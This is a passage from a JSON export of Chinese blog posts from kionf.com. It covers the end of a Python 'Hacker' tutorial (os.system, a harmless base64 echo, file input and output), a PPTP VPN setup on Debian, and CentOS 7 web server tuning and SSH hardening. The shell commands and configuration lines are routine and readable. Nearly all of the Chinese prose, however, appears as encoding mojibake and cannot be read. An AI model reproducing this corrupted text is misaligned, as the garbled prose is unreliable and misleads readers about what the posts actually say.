é€’ä¸€ä¸ªå‘½ä»¤ï¼Œç„¶åé€šè¿‡å®ƒå»åœ¨ç³»ç»Ÿåº•å±‚æ‰§è¡Œæˆ‘ä»¬ä¼ é€’çš„å‘½ä»¤.ä¸‹é¢æˆ‘ä»¬å°†ä¼šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤â€echo â€˜UHJpbWFsIFNlY3VyaXR5Cg==â€™ | base64 -dâ€: 1234&gt;&gt;&gt;&gt;&gt;&gt; os.system(\"echo 'UHJpbWFsIFNlY3VyaXR5Cg==' | base64 -d\")Primal Security&gt;&gt;&gt; åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ç°åœ¨æˆ‘ä»¬å°†æ¼”ç¤ºä¸€äº›ä¾‹å­,å¦‚ä½•åœ¨Pythoné‡Œé¢ä»ä¸€ä¸ªæ–‡ä»¶é‡Œé¢è¯»å–æ•°æ®å’Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ã€‚ä¸‹é¢çš„è¿™ä¸ªä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ï¼Œå¹¶ä¸”è¯»å–/å†™å…¥æ•°æ®åˆ°è¿™ä¸ªå¯¹è±¡é‡Œé¢ï¼Œé€šå¸¸ä½ è‡ªå·±è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®ï¼Œå¹¶ä¸”åšä¸€äº›é€»è¾‘å¤„ç†ç„¶åæŠŠè¾“å‡ºçš„å†™åˆ°æ–‡ä»¶é‡Œé¢: 12345678&gt;&gt;&gt;&gt;&gt;&gt; file = open('test.txt', 'w')&gt;&gt;&gt; file.write('Hello World')&gt;&gt;&gt; file.close() &gt;&gt;&gt; file = open('test.txt', 'r')&gt;&gt;&gt; file.readlines()['Hello World']&gt;&gt;&gt; åœ¨Pythonè§£é‡Šå™¨é‡Œé¢ç»ƒä¹ ä¸Šé¢çš„å†…å®¹å¹¶ä¸”å¤šåŠ å·©å›ºï¼Œå› ä¸ºè¿™äº›å†…å®¹åœ¨åé¢çš„ç« èŠ‚é‡Œé¢ä¼šç»å¸¸ä½¿ç”¨ï¼Œå½“æˆ‘å†™ä»£ç çš„æ—¶å€™ï¼Œæˆ‘å–œæ¬¢æ‰“å¼€ä¸¤ä¸ªç»ˆç«¯ï¼Œä¸€ä¸ªç”¨äºæ‰§è¡Œpythonè§£é‡Šå™¨ï¼Œè¿˜æœ‰ä¸€ä¸ªç”¨æ¥æŠŠé€»è¾‘å†™å…¥åˆ°è„šæœ¬é‡Œé¢ã€‚ä¸‹ä¸€ç« å°†ä¼šå†™ä¸€ä¸ªçœŸå®çš„Pythonè„šæœ¬ï¼Œ å£°æ˜å®šä¹‰ï¼Œç±»å’Œsysæ¨¡å—ã€‚","raw":null,"content":null,"categories":[{"name":"Python","slug":"Python","permalink":"https://kionf.com/categories/Python/"},{"name":"Hacker","slug":"Python/Hacker","permalink":"https://kionf.com/categories/Python/Hacker/"}],"tags":[]},{"title":"Linuxæ­å»ºvpnæœåŠ¡å™¨","slug":"linux-vpn","date":"2015-07-01T16:00:00.000Z","updated":"2018-10-31T10:19:28.311Z","comments":true,"path":"2015/07/02/linux-vpn/","link":"","permalink":"https://kionf.com/2015/07/02/linux-vpn/","excerpt":"\næ¼”ç¤ºä¸­ä½¿ç”¨çš„æ˜¯Debainç³»ç»Ÿ,ä½†æ€è·¯ç›¸åŒ,å¥½çš„æˆ‘ä»¬å¼€å§‹å§\n\n1ã€å®‰è£…PPTPD1apt-get install pptpd","text":"æ¼”ç¤ºä¸­ä½¿ç”¨çš„æ˜¯Debainç³»ç»Ÿ,ä½†æ€è·¯ç›¸åŒ,å¥½çš„æˆ‘ä»¬å¼€å§‹å§ 1ã€å®‰è£…PPTPD1apt-get install pptpd 2ã€ç¼–è¾‘pptpd.conf1vim /etc/pptpd.conf ä½¿éæ³¨é‡Šçš„å†…å®¹å¦‚ä¸‹ 123option /etc/ppp/pptpd-optionslocalip 192.168.0.1remoteip 192.168.0.234-238,192.168.0.245 è¿™ä¸¤å¥è®¾ç½®äº†å½“å¤–éƒ¨è®¡ç®—æœºé€šè¿‡pptpè”æ¥åˆ°vpnåæ‰€èƒ½æ‹¿åˆ°çš„ipåœ°å€èŒƒå›´å’ŒæœåŠ¡å™¨çš„ipåœ°å€è®¾ç½® 3ã€æ·»åŠ ç™»å½•ç”¨æˆ·1vim /etc/ppp/chap-secrets æ·»åŠ ä¸€è¡Œï¼Œå†…å®¹å¦‚ä¸‹ 123#client server secret IP addresses#ç”¨æˆ·å pptpd å¯†ç  å…è®¸è¿æ¥IPtest pptpd \"test\" * å¯†ç ç”¨å¼•å·æ‹¬èµ·æ¥ï¼Œæœ€åé‚£ä¸ªæ˜Ÿå·æ˜¯è¯´å…è®¸ä»ä»»ä½•IPåœ°å€è¿æ¥ï¼Œå¦‚æœä½ æƒ³å•ç‹¬è®¾å®šIPåœ°å€ä¹Ÿå¯ä»¥ ç†è®ºä¸Šåˆ°è¿™é‡Œä¸€ä¸ªvpnå°±å·²ç»æ­å»ºå®Œæ¯•äº†ã€‚ä¸è¿‡ä½ å¹¶ä¸èƒ½é€šè¿‡è¿™ä¸ªæ¥ä¸ŠInternetï¼Œå› ä¸ºæ‰€æœ‰çš„æ•°æ®éƒ½ä½œç”¨äºé‚£å°pptpdçš„æœåŠ¡å™¨ä¸Šï¼Œ è€Œä¸ä¼šä¼ å…¥æ‹¨å…¥çš„è®¡ç®—æœºè®¾å¤‡ä¸Šã€‚è¦ä¸ŠInternetè¿˜éœ€è¦é…ç½®iptablesï¼š 4ã€ è®¾ç½®DNSè§£æï¼Œç¼–è¾‘pptpd-options1vim /etc/ppp/pptpd-options åç§°å¯èƒ½ä¼šä¸åŒï¼Œå…·ä½“ä½ç½®åœ¨/etc/pptpd.conf18è¡Œå·¦å³ æ‰¾åˆ°ms-dnsï¼Œå–æ¶ˆæ‰æ³¨é‡Šï¼Œå¹¶ä¿®æ”¹DNSåœ°å€æˆ‘ç”¨çš„æ˜¯google dnsï¼Œå¦‚ä¸‹ : 12ms-dns 8.8.8.8ms-dns 8.8.4.4 5ã€ å¼€å¯è½¬å‘1vim /etc/sysctl.conf å–æ¶ˆå¦‚ä¸‹å†…å®¹è¡Œçš„æ³¨é‡Š 1net.ipv4.ip_forward=1 6ã€æ‰“å¼€IPè½¬å‘åŠŸèƒ½1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 7ã€è®¾ç½®iptables1iptables -t nat -I POSTROUTING -j MASQUERADE 8ã€ å¯åŠ¨æœåŠ¡1/etc/init.d/pptpd restart VPNæ­å»ºå®Œæ¯•ï¼Œå¯ä»¥å°è¯•ç”¨å®¢æˆ·ç«¯ç™»å½•äº†ã€‚pptpdç›‘å¬ç«¯å£å·ä¸º1723","raw":null,"content":null,"categories":[{"name":"VPN","slug":"VPN","permalink":"https://kionf.com/categories/VPN/"}],"tags":[]},{"title":"Centos7ä½œä¸ºwebæœåŠ¡å™¨ä¼˜åŒ–","slug":"linux-web","date":"2015-04-03T16:00:00.000Z","updated":"2018-10-31T10:19:28.311Z","comments":true,"path":"2015/04/04/linux-web/","link":"","permalink":"https://kionf.com/2015/04/04/linux-web/","excerpt":"Centos7ä½œä¸ºwebæœåŠ¡å™¨çš„ä¸€äº›ç®€å•é…ç½®","text":"Centos7ä½œä¸ºwebæœåŠ¡å™¨çš„ä¸€äº›ç®€å•é…ç½® 1. å…³é—­firewalldå¹¶æ›¿æ¢iptables1234systemctl stop firewalld.service #åœæ­¢firewallsystemctl disable firewalld.service #ç¦æ­¢firewallå¼€æœºå¯åŠ¨yum install iptables-services #å®‰è£…iptables -nvL #æŸ¥çœ‹è§„åˆ™ 2. åŠ å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶123456789vim /etc/security/limits.conf#æ·»åŠ å¦‚ä¸‹å†…å®¹:* soft nofile 1024000* hard nofile 1024000hive - nofile 1024000hive - nproc 1024000 ulimit -nulimit -a æŸ¥è¯¢å½“å‰é…ç½® 3. æ›´æ”¹ç”¨æˆ·è¿›ç¨‹é™åˆ¶123456vim /etc/security/limits.d/20-nproc.conf#æ›´æ”¹ä¸€ä¸‹å†…å®¹* soft nproc 40960root soft nproc unlimited #æ— é™åˆ¶ æ­¤æ­¥éª¤éœ€è¦é‡å¯æœºå™¨ç”Ÿæ•ˆï¼Œå¯ä»¥è®¾ç½®å®Œåå†é‡å¯ 4. ç½‘ç»œçº¿ç¨‹ä¼˜åŒ–vim /etc/sysctl.conf 1234567891011121314151617181920212223242526#åŠ å…¥å¦‚ä¸‹å†…å®¹# Disable IPv6net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1# Determines how often to check for stale neighbor entries.net.ipv4.neigh.default.gc_stale_time=120# Using arp_announce/arp_ignore to solve the ARP Problemnet.ipv4.conf.default.arp_announce = 2net.ipv4.conf.all.arp_announce=2vm.swappiness = 0net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_max_syn_backlog = 1024net.ipv4.tcp_synack_retries = 2net.ipv4.conf.lo.arp_announce=2net.ipv4.tcp_keepalive_time = 1800net.ipv4.tcp_keepalive_probes = 3net.ipv4.tcp_keepalive_intvl = 15net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_fin_timeout = 30 æ‰§è¡Œ/sbin/sysctl -pä½¿è®¾ç½®ç”Ÿæ•ˆ 5. æ—¶é—´æ ¡å¯¹123456789cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtimentpdate us.pool.ntp.orgcrontab -e0-59/10 * * * * /usr/sbin/ntpdate us.pool.ntp.org | logger -t NTPservice crond restart 6. å…³é—­rootç™»å½•å¹¶ä¿®æ”¹sshç«¯å£1. æ·»åŠ æ™®é€šç”¨æˆ·123groupadd poweruseradd -d /home/www/ -g power testpasswd test 2. iptableså¼€å¯5233ç«¯å£ 5233ä¸ºä¸‹é¢çš„æ›´æ”¹åsshç«¯å£, æ­¤æ­¥éª¤é¡»å…ˆäºä¸‹é¢æ­¥éª¤ï¼Œå¦åˆ™ä¼šé€ æˆsshè¿ä¸ä¸Šçš„ vi /etc/sysconfig/iptables æ·»åŠ  1-A INPUT -p tcp -m state --state NEW -m tcp --dport 5233 -j ACCEPT æ‰§è¡Œ/sbin/iptables restart 3. ä¿®æ”¹sshdé…ç½®æ–‡ä»¶vim /etc/ssh/sshd_config ç¦æ­¢rootç™»é™†æŠŠPermitRootLogin yesæ”¹ä¸ºPermitRootLogin no ä¿®æ”¹é»˜è®¤ç«¯å£å·æŠŠPort 22æ”¹ä¸ºPort 5233æœ€åæ‰§è¡Œsystemctl restart sshd.service 7. ç¦æ­¢ping12345678ç¦æ­¢echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_allå¼€å¯echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all#æ°¸ä¹…ä¿å­˜vi /etc/rc.d/rc.localecho 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all 8. ç½‘ç»œå‘½ä»¤ifconfig,netstatyum -y install net-tools","raw":null,"content":null,"categories":[{"name":"WEB","slug":"WEB","permalink":"https://kionf.com/categories/WEB/"}],"tags":[]}]}